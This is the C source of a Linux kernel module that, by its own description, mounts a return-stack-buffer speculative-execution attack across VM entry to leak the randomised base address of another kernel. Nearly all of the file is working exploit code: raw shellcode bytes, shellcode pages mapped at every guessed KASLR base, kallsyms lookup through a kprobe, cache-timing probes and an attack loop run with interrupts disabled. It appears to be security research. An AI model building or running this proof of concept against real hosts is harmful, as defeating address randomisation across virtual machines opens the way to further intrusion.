#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/gfp.h>
#include <linux/mm.h>
#include <linux/io.h>
#include <linux/vmalloc.h>
#include <linux/kprobes.h>
#include <asm/fixmap.h>
#include <asm/page.h>


// MODIFY THIS
/*
 ffffffff8179a914:	e8 67 ca d3 00       	call   ffffffff824d7380 <__pi___x86_indirect_thunk_rax>
 ffffffff8179a919:	ba e7 ff ff ff       	mov    edx,0xffffffe7
*/
static const u64 target_text_offset = 0x79a919;

///////////////////////////////////////////////////////////////

#define KERNEL_LOWER_BOUND 0xffffffff80000000UL
#define KERNEL_UPPER_BOUND 0xffffffffc0000000UL
#define KASLR_STEP 0x200000UL
#define N_TARGETS ((KERNEL_UPPER_BOUND - KERNEL_LOWER_BOUND) / KASLR_STEP)

static const u64 target_page_offset = target_text_offset & 0xfffUL;
static const u64 target_offset_page = target_text_offset & ~0xfffUL;

#define CHUNK_STEP 0x100
#define ATTEMPTS_PER_CHUNK 100

#define NUM_CACHE_TARGETS (N_TARGETS)
static char* cache_targets[NUM_CACHE_TARGETS];
static const u64 CACHE_TARGETS_BASE = 0xffffffff00000000UL;
static const u64 CACHE_TARGETS_STEP = 0x400UL;
static const u64 NUM_CACHE_TARGETS_PAGES = NUM_CACHE_TARGETS * CACHE_TARGETS_STEP / 0x1000UL;
static       u64 CACHE_TARGETS_PAGE_ORDER;  // const after init

// mov rax, 0x4141414141414141; mov al, [rax]; mfence; ret;
static u8 shellcode[] = {0x48, 0xb8, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x8a, 0x0, 0x0f, 0xae, 0xf0, 0xc3};
static u64* shellcode_target = (u64*)(shellcode + 2);
static u8* shellcodes[N_TARGETS];

static u64 cache_miss_threshold;
static struct {
	volatile char pad1[0x100];
	char target;
	volatile char pad2[0x100];
} __attribute__((aligned(0x100))) padded_cache_time_target;
#define cache_time_target (padded_cache_time_target.target)

#define KERNEL_SIZE 0x3000000
#define IS_MY_KERNEL(addr) ((addr) >= __stext && (addr) < (__stext + KERNEL_SIZE))

static struct kprobe kp = {
	.symbol_name = "kallsyms_lookup_name"
};
static unsigned long (*find_symbol)(const char* name);
static int (*_set_memory_ro)(unsigned long addr, int num);
static int (*_set_memory_x)(unsigned long addr, int num);
static void (*_set_pte_vaddr)(unsigned long, pte_t);
static u64 __stext;

static volatile char foo;

///////////////////////////////////////////////////////////////

#define LOG2(X) ((unsigned) (8 * sizeof (unsigned long long) - __builtin_clzll((X)) - 1))

extern void drain_rsb(void);  // Assembly attack

#define _mm_mfence() asm volatile("mfence; nop;":::"memory")
#define _mm_clflush(addr) asm volatile("clflush %0" : "+m" (*(volatile char *)(addr)))
#define __rdtsc() ({ \
	u32 lo, hi; \
	asm volatile("rdtsc" : "=a"(lo), "=d"(hi)); \
	((u64)hi << 32) | lo; \
})
void _maccess(volatile uint8_t* p);
__attribute__ ((naked)) void _maccess(volatile uint8_t* p)
{
	asm volatile(
		"mfence; nop;"
		"movq (%rdi), %rax;"
		"mfence; nop;"
		"ret;"
	);
}
#define TIME_ACCESS(addr) ({ \
	u64 _time_start, _time_end; \
	_mm_mfence(); \
	_time_start = __rdtsc(); \
	_maccess((volatile uint8_t*)(addr)); \
	_time_end = __rdtsc(); \
	_mm_mfence(); \
	_time_end - _time_start; \
})


static void init_constants(void)
{
	CACHE_TARGETS_PAGE_ORDER = LOG2(NUM_CACHE_TARGETS_PAGES);  // Should be ceil(log2(...)), but it is already aligned to a power of 2

	for (size_t i = 0; i < N_TARGETS; i++) {
		cache_targets[i] = (char*)(CACHE_TARGETS_BASE + i * CACHE_TARGETS_STEP);
	}

	for (size_t i = 0; i < N_TARGETS; i++) {
		shellcodes[i] = (u8*)(KERNEL_LOWER_BOUND + i * KASLR_STEP + target_offset_page);
	}
}

static int get_symbols(void)
{
	register_kprobe(&kp);
	find_symbol = (unsigned long (*)(const char *))kp.addr;
	if (!find_symbol) {
		pr_warn("failed to find kallsyms_lookup_name\n");
		return -1;
	}
	unregister_kprobe(&kp);

	_set_memory_ro = (int (*)(unsigned long, int))find_symbol("set_memory_ro");
	_set_memory_x = (int (*)(unsigned long, int))find_symbol("set_memory_x");
	_set_pte_vaddr = (void (*)(unsigned long, pte_t))find_symbol("set_pte_vaddr");
	__stext = find_symbol("_stext");
	return 0;
}

//////////////////////////////////////////////////////////////////

static void my_set_fixmap(u64 virt, phys_addr_t phys)
{
	pgprot_t flags = FIXMAP_PAGE_NORMAL;
	pte_t pte = pfn_pte(phys >> PAGE_SHIFT, flags);
	_set_pte_vaddr(virt, pte);
}

__attribute__((optimize("O0"))) static void calculate_cache_miss_threshold(void)
{
	u64 t;
	u64 min_cache_miss_time;

	cache_time_target = 1;  // Ensure page fault
	min_cache_miss_time = 1 << 20;

	pr_info("Calculating cache miss threshold\n");
	for (size_t i = 0; i < 0x100000; i++) {
		_mm_clflush(&cache_time_target);
			
		t = TIME_ACCESS(&cache_time_target);

		if (t < min_cache_miss_time) {
			min_cache_miss_time = t;
		}
	}

	cache_miss_threshold = min_cache_miss_time - 100;

	pr_info("Got cache miss threshold: %llu\n", cache_miss_threshold);
}

// Map target memory at fixed virtual address to be accessed by speculative shellcode
static void map_target_addresses(void)
{
	phys_addr_t phys;
	void* p;

	pr_info("Mapping cache target addresses\n");

	p = (char*)__get_free_pages(GFP_KERNEL, CACHE_TARGETS_PAGE_ORDER);
	if (!p) {
		pr_err("Unable to allocate cache targets page\n");
		BUG();
	}
	phys = virt_to_phys(p);
	for (size_t i = 0; i < N_TARGETS; i++) {
		my_set_fixmap((u64)cache_targets[i], (u64)phys + i * CACHE_TARGETS_STEP);
	}
	for (size_t i = 0; i < N_TARGETS; i++) {
		*(u64*)cache_targets[i] = 0x0123456789abcdef + i;  // Fill with random to avoid possible optimizations
	}
}

// Map shellcodes at guessed addresses and set them r-x
static void setup_shellcodes(void)
{
	phys_addr_t phys;
	u64 cache_offset = 0;
	void* p;

	int ret;

	pr_info("Setup shellcodes\n");

	for (size_t i = 0; i < N_TARGETS; i++) {
		if (IS_MY_KERNEL((u64)shellcodes[i])) {
			cache_offset++; cache_offset %= NUM_CACHE_TARGETS;
			continue;  // TODO: Need to move the attacking kernel to map these
		}
		p = (char*)__get_free_page(GFP_KERNEL);
		if (!p) {
			pr_err("Unable to allocate page\n");
			BUG();
		}

		memset(p, 0xcc, PAGE_SIZE);  // Fill with int3 to avoid false positives
		*shellcode_target = CACHE_TARGETS_BASE + cache_offset * CACHE_TARGETS_STEP;  // Point shellcode to cache target to leak address
		memcpy(p + target_page_offset, shellcode, sizeof(shellcode));
		cache_offset++; cache_offset %= NUM_CACHE_TARGETS;

		phys = virt_to_phys(p);

		my_set_fixmap((u64)shellcodes[i], phys);

		ret = _set_memory_ro((u64)shellcodes[i], 1);
		if (ret) goto map_shellcode_error;
		ret = _set_memory_x((u64)shellcodes[i], 1);
		if (ret) goto map_shellcode_error;

		continue;

	map_shellcode_error:
		pr_err("Failed to mark memory executable (error %d)\n", ret);
		BUG();
	}
}

__attribute__((optimize("O0"))) static bool check_cache_hit(const char* const address, u64 attempt, size_t gadget_ind)
{
	u64 t;

	t = TIME_ACCESS(address);

	if (t < cache_miss_threshold) {
		pr_info("Hit gadget %zu, cache hit time %llu at attempt %llu\n", gadget_ind, t, attempt);
		return true;
	}
	return false;
}


__attribute__((optimize("O0"))) static bool attack(void)
{
	size_t mix_i;
	bool already_got[CHUNK_STEP];
	bool got_any = false;

	pr_info("Starting attack\n");

	for (size_t chunk = 0; chunk < N_TARGETS; chunk += CHUNK_STEP) {
		memset(already_got, 0, sizeof(already_got));

		for (size_t attempt = 0; attempt < ATTEMPTS_PER_CHUNK; attempt++) {
			for (size_t i = chunk; i < chunk + CHUNK_STEP; i++) {
				mix_i = chunk + (((i * 167) + 13) & 0xff);
				if (IS_MY_KERNEL((u64)shellcodes[mix_i])) {
					continue;  // TODO: remove
				}
				((void(*)(void))((u64)shellcodes[mix_i] + target_page_offset))();  // Put gadgets in L1i cache
			}

			for (size_t i = chunk; i < chunk + CHUNK_STEP; i++) {
				mix_i = chunk + (((i * 167) + 13) & 0xff);
				_mm_clflush(cache_targets[mix_i]);
			}
			_mm_mfence();
			drain_rsb();  // Trigger speculative shellcode if correct guess
			
			for (size_t i = chunk; i < chunk + CHUNK_STEP; i++) {
				mix_i = chunk + (((i * 167) + 13) & 0xff);
				if (IS_MY_KERNEL((u64)shellcodes[mix_i])) {
					continue;  // TODO: remove
				}
				if (already_got[mix_i % CHUNK_STEP]) {
					continue;
				}
				if (check_cache_hit(cache_targets[mix_i], attempt, mix_i)) {
					pr_info("Kernel is at 0x%llx\n", (u64)shellcodes[mix_i] - target_offset_page);
					already_got[mix_i % CHUNK_STEP] = true;
					// Don't return to check for false positives
					got_any = true;
				}
			}
		}
	}
	return got_any;
}

struct timespec64 start_time;
struct timespec64 end_time;
static int __init my_module_init(void)
{
	bool success;

	init_constants();
	if (get_symbols()) {
		return -1;
	}

	pr_info("Attacker kernel is at: 0x%llx\n", (u64)__stext);

	calculate_cache_miss_threshold();
	ktime_get_ts64(&start_time);
	map_target_addresses();
	setup_shellcodes();

	pr_info("Entering critical section\n");
	asm("cli");

	success = attack();

	pr_info("Exiting critical section\n");
	asm("sti");
	ktime_get_ts64(&end_time);

	pr_info("Attack %s\n", success ? "succeeded" : "failed");
	u64 total_time = end_time.tv_nsec - start_time.tv_nsec + (long int)(end_time.tv_sec - start_time.tv_sec) * 1000000000L;
	pr_info("Attack time: %lld.%lld ms\n\n\n", total_time / 1000000L, total_time % 1000000L / 10000L);

	return 0;
}

static void __exit my_module_exit(void)
{
	// Remove everything (just restart the vm)
}

module_init(my_module_init);
module_exit(my_module_exit);

MODULE_AUTHOR("Chino");
MODULE_DESCRIPTION("rsb vmenter kaslr leak");
MODULE_VERSION("0.1");
MODULE_LICENSE("GPL");
